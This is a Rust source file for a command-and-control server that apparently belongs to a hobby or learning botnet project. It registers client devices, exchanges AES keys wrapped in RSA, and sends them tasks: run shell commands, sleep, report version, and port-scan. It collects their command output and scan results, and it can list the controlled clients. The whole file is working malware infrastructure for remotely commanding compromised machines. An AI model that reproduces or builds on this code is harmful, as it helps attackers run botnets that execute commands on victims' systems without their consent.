use base64;
use common::common::*;
use lazy_static::lazy_static;
use rand::rngs::OsRng;
use regex::Regex;
use rsa::pkcs1::FromRsaPublicKey;
use rsa::{PaddingScheme, PublicKey, RsaPublicKey};
use serde::Serialize;
use std::collections::HashMap;
use std::error;
use std::fmt::Debug;
use std::io;
use std::io::BufRead;
use std::io::BufReader;
use std::io::Write;
use std::net::{TcpListener, TcpStream};
use std::str;
use std::sync::Arc;
use std::sync::Mutex;
use std::time;
use threadpool::ThreadPool;
use uuid::Uuid;
const HOST: &str = "127.0.0.1";
const PORT: usize = 8080;
const NUM_THREADS: usize = 10;
lazy_static! {
    static ref UUID_RGX: Regex =
        Regex::new(r"^/uuid (?P<uuid>\w{8}-\w{4}-\w{4}-\w{4}-\w{12})\n$").unwrap();
}
// Change the alias to `Box<error::Error>`.
type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
#[derive(Debug)]
struct ClientInfo {
    addr: String,
    aes_key: String,
}
impl ClientInfo {
    fn aes_encrypt(&self, msg: &str) -> Vec<u8> {
        aes_encrypt(&self.aes_key, msg)
    }
    fn aes_decrypt(&self, buf: Vec<u8>) -> Result<String> {
        aes_decrypt(&self.aes_key, buf)
    }
}
fn generate_aes_key() -> String {
    let random_bytes: Vec<u8> = (0..24).map(|_| rand::random::<u8>()).collect();
    base64::encode(random_bytes)
}
fn process_get_command_payload(client: &ClientInfo) -> Result<Vec<u8>> {
    send_success(
        client,
        AskRes {
            cmds: vec![
                Cmd::Version,
                Cmd::Sleep(time::Duration::from_millis(1000)),
                Cmd::Exec("ls -lh".to_owned()),
                Cmd::PortScan("127.0.0.1".to_owned(), 1, 65535),
            ],
        },
    )
}
fn process_exec_payload(client: &ClientInfo, v: ExecPayload) -> Result<Vec<u8>> {
    let stdout = String::from_utf8(v.stdout)?;
    io::stdout().write_all(stdout.as_bytes())?;
    send_success(client, AckRes {})
}
fn process_port_scan_payload(client: &ClientInfo, p: PortScanPayload) -> Result<Vec<u8>> {
    println!("Port scan result: {:?}", p.result);
    send_success(client, AckRes {})
}
fn process_version_payload(client: &ClientInfo) -> Result<Vec<u8>> {
    send_success(client, AckRes {})
}
fn send_success<T>(client: &ClientInfo, p: T) -> Result<Vec<u8>>
where
    T: Serialize + Debug,
{
    let res = Response {
        success: true,
        payload: Some(p),
    };
    let result = serde_json::to_string(&res)?;
    Ok(client.aes_encrypt(&result))
}
fn handle_unknown_uuid_payload(stream: &mut TcpStream) -> Result<()> {
    let res = Response {
        success: true,
        payload: Some(UnknownUUIDRes {}),
    };
    let result = serde_json::to_vec(&res)?;
    stream.write_all(&result)?;
    Ok(())
}
// Read a line from tcp socket
fn get_line(stream: &mut TcpStream) -> Result<String> {
    let mut reader = BufReader::new(stream.try_clone()?);
    let mut buf = String::new();
    reader.read_line(&mut buf)?;
    Ok(buf)
}
impl CncInner {
    fn handle_auth_payload(&self, stream: &mut TcpStream, auth_payload: AuthPayload) -> Result<()> {
        let connected_devices = self.connected_devices.lock().unwrap();
        if let Some(client) = connected_devices.get(&auth_payload.client_uuid) {
            let dec = client.aes_decrypt(auth_payload.payload)?;
            println!("RECV: {}", dec);
            let payload: Payload = serde_json::from_str(&dec)?;
            let ciphertext = match payload {
                Payload::PortScan(p) => process_port_scan_payload(client, p),
                Payload::GetCommand(_) => process_get_command_payload(client),
                Payload::Version(_) => process_version_payload(client),
                Payload::Exec(v) => process_exec_payload(client, v),
            };
            stream.write_all(&ciphertext?)?;
        } else {
            handle_unknown_uuid_payload(stream)?;
        }
        Ok(())
    }
    fn process_register_payload(&self, stream: &TcpStream, v: RegisterPayload) -> Result<Vec<u8>> {
        let client_uuid = Uuid::new_v4();
        let addr = stream.local_addr()?.to_string();
        let key = generate_aes_key();
        let client_aes_key = key;
        let mut connected_devices = self.connected_devices.lock().unwrap();
        connected_devices.insert(
            client_uuid.to_string(),
            ClientInfo {
                addr,
                aes_key: client_aes_key.to_string(),
            },
        );
        let res = Response {
            success: true,
            payload: Some(RegisterRes {
                uuid: client_uuid.to_string(),
                aes_key: client_aes_key.to_string(),
            }),
        };
        let result = serde_json::to_vec(&res)?;
        let client_pub_key = RsaPublicKey::from_pkcs1_pem(v.public_key.as_str())?;
        let mut rng = OsRng;
        let enc =
            client_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), &result[..])?;
        Ok(enc)
    }
    fn process_display_client(&self, uuid: &str, stream: &mut TcpStream) -> Result<()> {
        let connected_devices = self.connected_devices.lock().unwrap();
        if let Some(c) = connected_devices.get(uuid) {
            stream.write_all(format!("{:?}\n", c).as_bytes())?;
        } else {
            stream.write_all("uuid not found\n".as_bytes())?;
        }
        Ok(())
    }
    fn process_display_clients(&self, stream: &mut TcpStream) -> Result<()> {
        let connected_devices = self.connected_devices.lock().unwrap();
        for (key, _) in connected_devices.iter() {
            stream.write_all(format!("{:?}\n", key).as_bytes())?;
        }
        Ok(())
    }
    fn handle_uuid(&self, buf: &str, stream: &mut TcpStream) -> Result<()> {
        if let Some(captures) = UUID_RGX.captures(&buf) {
            let uuid = &captures["uuid"];
            self.process_display_client(uuid, stream)?;
        }
        Ok(())
    }
    fn handle_register_payload(
        &self,
        stream: &mut TcpStream,
        buf: &str,
        payload: RegisterPayload,
    ) -> Result<()> {
        println!("RECV: {}", buf);
        let ciphertext = self.process_register_payload(&stream, payload)?;
        stream.write_all(&ciphertext)?;
        Ok(())
    }
    fn process_line(&self, stream: &mut TcpStream, buf: &str) -> Result<()> {
        if UUID_RGX.is_match(&buf) {
            self.handle_uuid(&buf, stream)?;
        } else if buf == "/list\n" {
            self.process_display_clients(stream)?;
        } else if let Ok(payload) = serde_json::from_str::<RegisterPayload>(&buf) {
            self.handle_register_payload(stream, &buf, payload)?;
        } else if let Ok(auth_payload) = serde_json::from_str::<AuthPayload>(&buf) {
            self.handle_auth_payload(stream, auth_payload)?;
        }
        Ok(())
    }
    fn process_stream(&self, stream: &mut TcpStream) -> Result<()> {
        let buf = get_line(stream)?;
        self.process_line(stream, &buf)?;
        Ok(())
    }
    fn handle_connection(&self, stream: &mut TcpStream) {
        match self.process_stream(stream) {
            Ok(_) => {}
            Err(e) => println!("{:?}", e),
        };
    }
}
struct CncInner {
    connected_devices: Mutex<HashMap<String, ClientInfo>>,
}
// We need an inner struct so that we can spawn multiple threads
// and access inner properties from the threads.
struct CnC {
    inner: Arc<CncInner>,
}
impl CnC {
    fn new() -> Self {
        CnC {
            inner: Arc::new(CncInner {
                connected_devices: Mutex::new(HashMap::new()),
            }),
        }
    }
    // Listen for TCP connections.
    // Handles streams with a thread pool.
    fn listen(&mut self) -> Result<()> {
        let listener = TcpListener::bind(format!("{}:{}", HOST, PORT))?;
        let pool = ThreadPool::new(NUM_THREADS);
        println!("start listening on {}:{}", HOST, PORT);
        for stream_res in listener.incoming() {
            if let Ok(mut stream) = stream_res {
                let inner_clone = self.inner.clone();
                pool.execute(move || {
                    inner_clone.handle_connection(&mut stream);
                });
            }
        }
        Ok(())
    }
}
fn main() {
    CnC::new().listen().unwrap();
}